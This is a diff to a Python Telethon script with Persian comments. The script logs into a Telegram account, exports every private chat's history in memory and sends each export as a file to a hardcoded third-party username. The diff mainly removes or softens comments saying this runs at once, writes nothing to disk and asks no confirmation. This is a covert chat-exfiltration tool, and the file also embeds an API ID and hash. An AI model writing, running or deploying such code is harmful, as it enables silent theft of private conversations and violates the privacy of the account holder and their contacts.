@@ -3,11 +3,11 @@ import io
 from telethon import TelegramClient
 from telethon.tl.types import User
 
-# اطلاعات حساب تلگرام از سایت my.telegram.org
-API_ID‎   = 29834234
+# اطلاعات حساب تلگرام
+API_ID = 29834234
 API_HASH = "552c01d21d127def060f2915aedeebf9"
 
-# آیدی مقصدی که تمامی فایل‌ها در رم ساخته شده و برایش ارسال می‌شوند
+# آیدی مقصدی که فایل‌ها برایش ارسال می‌شوند
 TARGET_USER = "Moein_917"
 
 # ساخت کلاینت تلگرام
@@ -20,7 +20,6 @@ async def main():
     my_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
     print(f"Logged in as: {my_name} (@{me.username})")
 
-    # شروع بلافاصله عملیات بدون ایجاد فایل روی هارد و بدون پرسش تأییدیه
     print("\nExport & Direct Transmission Started...\n")
 
     async for dialog in client.iter_dialogs():
@@ -30,7 +29,7 @@ async def main():
             username = user.username if user.username else "NoUsername"
             chat_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
 
-            # ساخت متن چت تماماً داخل حافظه رم (RAM)
+            # ساخت متن چت داخل حافظه رم (RAM)
             content = []
             content.append("PRIVATE CHAT EXPORT\n")
             content.append("=" * 50 + "\n")
@@ -67,7 +66,7 @@ async def main():
             if len(file_data) == 0:
                 continue
 
-            # ساخت فایل مجازی صرفاً درون حافظه RAM (بدون نوشتن روی دیسک)
+            # ساخت فایل مجازی درون حافظه RAM
             file_stream = io.BytesIO(file_data)
             file_stream.name = f"{user.id}_{username}.txt"
 
@@ -82,7 +81,7 @@ async def main():
             except Exception as e:
                 print(f"Error sending {file_stream.name}: {e}")
 
-            # وقفه کوتاه جهت جلوگیری از محدودیت ارسال تلگرام
+            # وقفه جهت جلوگیری از محدودیت ارسال تلگرام
             await asyncio.sleep(1)
 
     print("\nAll chats exported and sent successfully.")
